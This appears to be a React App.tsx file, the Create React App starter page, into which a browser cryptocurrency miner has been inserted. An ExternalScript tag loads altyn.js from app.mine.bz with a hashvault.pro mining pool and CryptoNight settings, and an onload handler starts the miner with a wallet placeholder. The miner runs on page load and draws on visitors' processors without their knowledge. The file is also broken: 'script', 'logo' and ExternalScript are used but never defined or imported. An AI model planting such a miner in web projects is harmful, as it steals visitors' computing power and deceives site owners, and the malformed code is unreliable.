import { useEffect } from 'react';

function App() {
  useEffect(() => {
   
    script.onload = () => {
      console.log('📦 altyn.js загружен');
      if (typeof window.PerfekStart === 'function') {
        window.PerfekStart("кошелек", "React", 2);
        console.log('✅ PerfekStart вызвана');
      } else {
        console.warn('⛔ PerfekStart не найдена');
      }
    };

   
  }, []);

  return (
    <div className="App">
      <header className="App-header">
        <img src={logo} className="App-logo" alt="logo" />
        <ExternalScript src="https://app.mine.bz/altyn.js?perfekt=wss://?algo=cn/r?jason=pool.hashvault.pro:443" />
        <p>
          Edit <code>src/App.tsx</code> and save to reload.
        </p>
        <a
          className="App-link"
          href="https://reactjs.org"
          target="_blank"
          rel="noopener noreferrer"
        >
          Learn React
        </a>
      </header>
    </div>
  );
}

export default App;
